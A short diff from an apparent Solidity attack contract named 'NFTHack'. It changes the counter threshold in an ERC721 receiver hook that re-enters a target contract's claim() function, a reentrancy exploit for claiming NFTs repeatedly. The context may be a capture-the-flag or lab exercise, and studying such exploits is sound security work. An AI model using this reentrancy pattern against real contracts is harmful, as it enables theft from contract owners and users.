@@ -32,7 +32,7 @@ contract NFTHack{
         // target.call(abi.encodeWithSignature("balanceOf(address)",addr));
         counter+=1;
         
-        if(counter>0){
+        if(counter>3){
             return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
         }
         (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
